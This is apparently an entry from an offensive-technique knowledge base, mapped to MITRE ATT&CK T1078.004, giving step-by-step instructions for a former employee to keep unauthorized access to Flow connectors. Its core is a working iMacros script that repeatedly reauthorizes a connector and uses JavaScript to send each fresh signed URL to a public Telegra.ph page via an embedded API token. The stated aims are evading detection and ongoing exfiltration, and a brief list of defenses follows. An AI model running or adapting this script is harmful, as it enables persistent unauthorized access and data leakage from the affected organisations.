---
tags:
  - automation
  - imacros
  - persistence
type: procedure
tools:
  - '[[tools/iMacros-for-Firefox]]'
  - '[[tools/Telegra-ph-API]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/imacros-refresh-flow-url]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1078.004]]'
updated_at: '2025-12-14T17:29:44.780Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 84e9de34-59a1-49f9-aa88-a5797130ff0b
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[T1078.004]]'
---
# Automate-Persistent-Access-with-iMacros

## Summary

This procedure automates the disconnect/reconnect cycle using iMacros to refresh signed URLs every ~45 minutes, updating a Telegra.ph page with the latest valid URL for indefinite ex-staff access to Flow connectors.

## Description

Install iMacros in Firefox and load a custom script that loops through UI elements: disconnect, wait, connect, authorize, capture current URL via JavaScript, and send it to Telegra.ph API for public storage. The script runs 100 times (~2 days) with delays to avoid detection. This achieves persistence by perpetually regenerating valid parameters without re-authentication, allowing ongoing data redirection and exfiltration.

## Requirements

1. iMacros for Firefox extension installed
2. Valid Telegra.ph access token for API edits
3. Browser session with saved signed URL access

## Defense

Defensive measures and detection strategies:

- Detect automated browser actions via user-agent or behavior anomalies
- Rate-limit connector changes and monitor for scripted patterns
- Block or alert on API calls to external services like Telegra.ph from admin sessions

## Objectives

1. Automate URL refresh for long-term persistence
2. Store fresh URLs externally for reference
3. Maintain unauthorized access without manual effort

## Instructions

### Step 1: Install and Configure iMacros

**Context**: Set up the automation tool.

No specific command; manual setup:

Install from https://addons.mozilla.org/en-US/firefox/addon/imacros-for-firefox/ > Create new script.

> iMacros ready for scripting.

### Step 2: Load and Run Script

**Context**: Execute the automation using [[commands/imacros-refresh-flow-url]].

**Command** ([[commands/imacros-refresh-flow-url]]):
```imacros
VERSION BUILD=10021450
SET !LOOP 100
TAG POS=2 TYPE=SPAN ATTR=TXT:Disconnect
WAIT SECONDS=10
TAG POS=2 TYPE=SPAN ATTR=TXT:Connect
WAIT SECONDS=10
TAG POS=1 TYPE=DIV ATTR=TXT:Jorge<SP>Perez<SP>Hilton
WAIT SECONDS=10
TAG POS=2 TYPE=SPAN ATTR=TXT:Permitir
WAIT SECONDS=10
SET !VAR1 EVAL("var HttpR = new XMLHttpRequest();var urlQ=\"https://api.telegra.ph/editPage/Realtime-Updated-URL-to-Access-Flow-Connectors-09-23?access_token=3929aa6b0e9a7d6653a7f40a0e7d8dacd1532125289a16b8949306d11b66&title=Realtime+Updated+URL+to+Access+Flow+Connectors&author_name=ex-employee+and+a+very+bad+guy.&content=[{\"tag\":\"p\",\"children\":[\"\"+encodeURIComponent(window.location.href)+\"\"]}]&return_content=true\";HttpR.open(\"GET\", urlQ);HttpR.send();")
WAIT SECONDS=1760
```

> Script loops: disconnects, reconnects, authorizes, captures URL, updates Telegra.ph, waits ~30 minutes; repeats 100 times.

### Step 3: Monitor Automation

**Context**: Verify persistent access via updated page.

No specific command; manual check:

Visit https://telegra.ph/Realtime-Updated-URL-to-Access-Flow-Connectors-09-23 > Check for fresh URLs.

> Page updates with valid signed URLs for ongoing use.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[T1078.004]]

### Sub-Techniques


## Commands Used

- [[commands/imacros-refresh-flow-url]]

## Tools Used

- [[tools/iMacros-for-Firefox]]
- [[tools/Telegra-ph-API]]

## Tags

- [[automation]]
- [[imacros]]
- [[Persistence]]
